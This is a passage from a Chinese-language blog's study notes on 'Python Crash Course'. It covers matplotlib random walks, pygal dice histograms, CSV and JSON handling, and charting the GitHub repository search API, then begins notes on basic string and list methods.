class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#拒绝原地踏步</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span> x_step == <span class="number">0</span> <span class="keyword">and</span> y_step == <span class="number">0</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">                <span class="keyword">continue</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#计算下一个点的xy的值</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">            next_x = self.x_values[<span class="number">-1</span>] + x_step</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            next_y = self.y_values[<span class="number">-1</span>] + y_step</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#更新坐标值</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            self.x_values.append(next_x)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">            self.y_values.append(next_y)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#开始绘制</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">6</span>)) <span class="comment">#可以传入的参数包括dpi像素，大小，背景色</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">rw = RandWalk()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">rw.fill_walk()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">plt.scatter(rw.x_values, rw.y_values, c=list(range(rw.num_points)), cmap=plt.cm.Blues, edgecolor=<span class="string">'none'</span>, s=<span class="number">1</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#突出起点和终点</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">plt.scatter(<span class="number">0</span>, <span class="number">0</span>, edgecolors=<span class="string">'none'</span>, c=<span class="string">'red'</span>, s=<span class="number">40</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">plt.scatter(rw.x_values[<span class="number">-1</span>], rw.y_values[<span class="number">-1</span>], edgecolors=<span class="string">'none'</span>, c=<span class="string">'yellow'</span>, s=<span class="number">40</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#隐藏坐标轴</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">plt.axes().get_xaxis().set_visible(<span class="literal">False</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">plt.axes().get_yaxis().set_visible(<span class="literal">False</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">plt.show()</span></pre></td></tr></table></figure><p><img src="PYTHON%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96_9_1.png" alt="" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandWalk</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="string">'''随机生成漫步数据的类'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, num_points=<span class="number">5000</span>)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        self.num_points = num_points</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        self.x_values = [<span class="number">0</span>]<span class="comment">#随机漫步从（0,0）出发</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        self.y_values = [<span class="number">0</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_walk</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        <span class="string">'''计算随机漫步的所有点'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        <span class="comment">#不断漫步，直到达到指定的长度</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">while</span> len(self.x_values) &lt; self.num_points:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#决定前进的方向和前进距离</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            x_direction = choice([<span class="number">1</span>,<span class="number">-1</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            x_distance = choice([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">            x_step = x_direction * x_distance</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            y_direction = choice([<span class="number">1</span>,<span class="number">-1</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            y_distance = choice([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">            y_step = y_direction * y_distance</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#拒绝原地踏步</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span> x_step == <span class="number">0</span> <span class="keyword">and</span> y_step == <span class="number">0</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">                <span class="keyword">continue</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#计算下一个点的xy的值</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">            next_x = self.x_values[<span class="number">-1</span>] + x_step</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">            next_y = self.y_values[<span class="number">-1</span>] +y_step</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#更新坐标值</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            self.x_values.append(next_x)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">            self.y_values.append(next_y)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#开始绘制</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">6</span>))<span class="comment">#可以传入的参数包括dpi像素，大小，背景色</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">rw = RandWalk()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">rw.fill_walk()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">plt.plot(rw.x_values, rw.y_values, linewidth=<span class="number">1</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#突出起点和终点</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#plt.plot(0, 0, edgecolors='none', c='red', s=40)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#plt.plot(rw.x_values[-1], rw.y_values[-1], edgecolors='none', c='yellow', linewidth=4)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">plt.show()</span></pre></td></tr></table></figure><p><img src="PYTHON%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96_10_0.png" alt="" /></p><h3 id="16pygal"><a class="markdownIt-Anchor" href="#16pygal"></a> 1.6Pygal</h3><p>参考图表类画廊http://www.pygal.org 每个示例都包含产生代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#掷骰子的类</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Die</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    <span class="string">'''表示一个骰子的类'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, num_sides)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        self.num_sides = num_sides</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roll</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">return</span> randint(<span class="number">1</span>,self.num_sides)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试上面的类是否可行</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">sides = <span class="number">6</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">die = Die(sides)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">results = []</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> roll_num <span class="keyword">in</span> range(<span class="number">1000</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    result = die.roll()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    results.append(result)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#print(results)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">num_values = []</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#分析结果，做统计</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1</span>+sides):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    values = results.count(value)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    num_values.append(values)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#print(num_values)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#绘制直方图，将数据可视化</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">hist = pygal.Bar()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">hist.title= <span class="string">'Results of rolling D6 1000 times'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">hist.x_labels = [<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">hist.x_title = <span class="string">'num_values'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">hist.y_title = <span class="string">'Frequency of Result'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#add函数</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">hist.add(<span class="string">'D6'</span>,num_values)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">hist.render_to_file(<span class="string">'die_visual.svg'</span>)</span></pre></td></tr></table></figure><h2 id="二-下载数据后的数据的处理"><a class="markdownIt-Anchor" href="#二-下载数据后的数据的处理"></a> 二、下载数据后的数据的处理</h2><p>下载后的数据文件一般分为两种格式：</p><ul><li>csv格式 用逗号隔开</li><li>json格式 列表中的元素是字典类型[{}, {}, {}]  json.load() json.dump()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">filename = <span class="string">''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    reader = csv.reader(f)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    header_csv = next(reader)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    <span class="comment">#获取文件头的数据和索引</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span> index,value = enumerate(header_csv):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        print(index+<span class="string">':'</span>+value)</span></pre></td></tr></table></figure><pre><code>  File &quot;&lt;ipython-input-57-64c6bbc4aaa4&gt;&quot;, line 8    for index,value = enumerate(header_csv):                    ^SyntaxError: invalid syntax</code></pre><h2 id="三-使用api"><a class="markdownIt-Anchor" href="#三-使用api"></a> 三、使用API</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入requests模块，使用pygal来可视化数据</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pygal.style <span class="keyword">import</span> LightColorizedStyle <span class="keyword">as</span> LCS, LightenStyle <span class="keyword">as</span> LS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">url = <span class="string">'https://api.github.com/search/repositories?q=language:python&amp;sort=stars'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">r = requests.get(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">print(<span class="string">'status code：'</span>, r.status_code)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">reponse_dict = r.json()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">print(reponse_dict.keys())<span class="comment">#响应字典</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#研究第一个仓库</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">repo_dicts = reponse_dict[<span class="string">'items'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">repo_dict = repo_dicts[<span class="number">0</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一个仓库包含的信息</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">print(len(repo_dict.keys()))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> sorted(repo_dict.keys()):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    print(key)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">names,stars = [],[]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> repo_dict <span class="keyword">in</span> repo_dicts:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    names.append(repo_dict[<span class="string">'name'</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    stars.append(repo_dict[<span class="string">'stargazers_count'</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">my_style = LS(<span class="string">'#333366'</span>,base_style=LCS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">chart = pygal.Bar(style=my_style, x_label_rotation=<span class="number">45</span>, show_legend=<span class="literal">False</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">chart.title = <span class="string">'Most-Starred Python Projects on Github'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">chart.x_labels = names</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">chart.add(<span class="string">''</span>,stars)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">chart.render_to_file(<span class="string">'python_repos.svg'</span>)</span></pre></td></tr></table></figure><pre><code>status code： 200dict_keys(['total_count', 'incomplete_results', 'items'])73archive_urlarchivedassignees_urlblobs_urlbranches_urlclone_urlcollaborators_urlcomments_urlcommits_urlcompare_urlcontents_urlcontributors_urlcreated_atdefault_branchdeployments_urldescriptiondownloads_urlevents_urlforkforksforks_countforks_urlfull_namegit_commits_urlgit_refs_urlgit_tags_urlgit_urlhas_downloadshas_issueshas_pageshas_projectshas_wikihomepagehooks_urlhtml_urlidissue_comment_urlissue_events_urlissues_urlkeys_urllabels_urllanguagelanguages_urllicensemerges_urlmilestones_urlmirror_urlnamenode_idnotifications_urlopen_issuesopen_issues_countownerprivatepulls_urlpushed_atreleases_urlscoresizessh_urlstargazers_countstargazers_urlstatuses_urlsubscribers_urlsubscription_urlsvn_urltags_urlteams_urltrees_urlupdated_aturlwatcherswatchers_count</code></pre><p>下面还有hacker news示例，就不再总结了，主要包括通过api请求资源，将响应按照json格式进行处理，最后进行信息提取展示。还是要熟练<code>json</code>的格式</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PYTHON编程：从入门到实践（学习笔记）</title>
      <link href="/archives/8409c1ac.html"/>
      <url>/archives/8409c1ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="python基础"><a class="markdownIt-Anchor" href="#python基础"></a> Python基础</h1><h2 id="一-安装"><a class="markdownIt-Anchor" href="#一-安装"></a> 一、安装</h2><pre><code>1、版本v2.x  v3.x2、操作系统LINUX、WINDOWS、MAC OS3、管理工具安装anaconda、操作命令安装</code></pre><h2 id="二-变量和简单数据类型"><a class="markdownIt-Anchor" href="#二-变量和简单数据类型"></a> 二、变量和简单数据类型</h2><h3 id="21变量"><a class="markdownIt-Anchor" href="#21变量"></a> 2.1变量</h3><p>用来保存存储的内容</p><h3 id="22字符串"><a class="markdownIt-Anchor" href="#22字符串"></a> 2.2字符串</h3><blockquote><p>一系列字符。</p></blockquote><ul><li><p>创建字符串“”</p></li><li><p>capitalize():首字母大写string.capitalize()-----&gt;String</p></li><li><p>center():居中，参数添加显示字符宽度</p></li><li><p>chr()</p></li><li><p>cmp()</p></li><li><p>count()计数</p></li><li><p>decode()解码</p></li><li><p>encode()编码</p></li><li><p>endswith()判断是否以某段字符结尾</p></li><li><p>expandtabs()</p></li><li><p>find()查找字符串中的位置，返回第一个查找到的下标</p></li><li><p>format()格式化字符串</p></li><li><p>hex()</p></li><li><p>index()返回索引值</p></li><li><p>isalnum()</p></li><li><p>isalpha</p></li><li><p>isdecimal()</p></li><li><p>isdigit()</p></li><li><p>islower()</p></li><li><p>isnumeric()</p></li><li><p>isspace()</p></li><li><p>istitle()是否首字母大写</p></li><li><p>isupper()是否全部大写</p></li><li><p>join()连接</p></li><li><p>len()计算出长度</p></li><li><p>list()转换为字符串</p></li><li><p>ljust()左对齐，传入参数表示显示字符宽度</p></li><li><p>lower()将所有大写变为小写</p></li><li><p>lstrip()去掉左边空格</p></li><li><p>max()</p></li><li><p>min()</p></li><li><p>oct()</p></li><li><p>ord()</p></li><li><p>partition()以参数中的字符分区</p></li><li><p>replace()</p></li><li><p>repr()</p></li><li><p>rfind()从左边查找，返回下标索引</p></li><li><p>rindex()</p></li><li><p>rjust()右对齐</p></li><li><p>rpartition()从右边开始查找分区的字符</p></li><li><p>rsplit()拆分字符</p></li><li><p>rstrip()</p></li><li><p>split()</p></li><li><p>splitlines()</p></li><li><p>startswith()</p></li><li><p>str()</p></li><li><p>strip()</p></li><li><p>swapcase()</p></li><li><p>translate()</p></li><li><p>tuple()</p></li><li><p>type()</p></li><li><p>upper()</p></li><li><p>zfill()填充0</p></li><li><p>合并拼接字符串：可以使用+</p></li><li><p>使用制表符\t和换行符\n</p></li><li><p>删除空白：rstrip()、lstrip()、strip()</p></li><li><p>要注意’’ 和 `的区别 如果在一起使用的话可以从trackback中看到错误信息</p></li></ul><h3 id="23数字"><a class="markdownIt-Anchor" href="#23数字"></a> 2.3数字</h3><p>加减乘除、乘方运算(**)、取余%</p><ul><li>整数： ±*/  注意地板除(//)向下取整</li><li>浮点数：</li><li>使用str()来避免类型错误</li></ul><h3 id="24注释"><a class="markdownIt-Anchor" href="#24注释"></a> 2.4注释</h3><blockquote><p>使用注释的目的是阐述代码要做什么</p></blockquote><ul><li>使用#</li><li>python之禅：import this</li></ul><h2 id="三-列表"><a class="markdownIt-Anchor" href="#三-列表"></a> 三、列表</h2><blockquote><p>由一系列特定顺序的元素组成，用[]来表示列表。元素用逗号隔开，</p></blockquote><h3 id="31访问列表"><a class="markdownIt-Anchor" href="#31访问列表"></a> 3.1访问列表</h3><ul><li><p>列表是有序集合，用索引值即可，<strong>索引值从0开始</strong></p></li><li><p>可以使用负数索引：</p><p>a=[1,2,3,4]<br />a[-1]<br />4</p></li></ul><h3 id="32修改-添加-删除列表元素"><a class="markdownIt-Anchor" href="#32修改-添加-删除列表元素"></a> 3.2修改、添加、删除列表元素</h3><ul><li>修改：使用列表名和索引值修改</li><li>增加：append()、insert(position， value)</li><li>删除：del()、pop()、remove()，两者的区别是第二种方法可以返回删除的元素，pop(index)可以弹出指定的值。其中remove只删除第一个指定的值</li></ul><h3 id="33组织列表"><a class="markdownIt-Anchor" href="#33组织列表"></a> 3.3组织列表</h3><ul><li>排序sort(),永久性修改。可以通过修改reverse=True反向排序</li><li>排序sorted(),临时性修改。可以通过修改reverse=True反向排序</li><li>反转reverse()，注意不是排序</li><li>len()</li></ul><h3 id="34每当访问最后一个元素的时候都是用索引值-1"><a class="markdownIt-Anchor" href="#34每当访问最后一个元素的时候都是用索引值-1"></a> 3.4每当访问最后一个元素的时候都是用索引值-1</h3><h2 id="四-操作列表"><a class="markdownIt-Anchor" href="#四-操作列表"></a> 四、操作列表</h2><h3 id="41遍历列表"><a class="markdownIt-Anchor" href="#41遍历列表"></a> 4.1遍历列表</h3><blockquote><p>使用for循环，循环是计算机自动完成重复工作的常见方式之一</p></blockquote><p><strong>for in ：</strong><br />这时候接触到代码块了，要注意代码块的缩进规则</p><h3 id="42创建数值列表"><a class="markdownIt-Anchor" href="#42创建数值列表"></a> 4.2创建数值列表</h3><ul><li>使用range(start, end, steps)产生一系列数字</li><li>使用list()将range()产生的数字转成列表</li></ul><h3 id="43简单统计计算"><a class="markdownIt-Anchor" href="#43简单统计计算"></a> 4.3简单统计计算</h3><ul><li>max()</li><li>min()</li><li>sum()</li></ul><h3 id="44列表解析"><a class="markdownIt-Anchor" href="#44列表解析"></a> 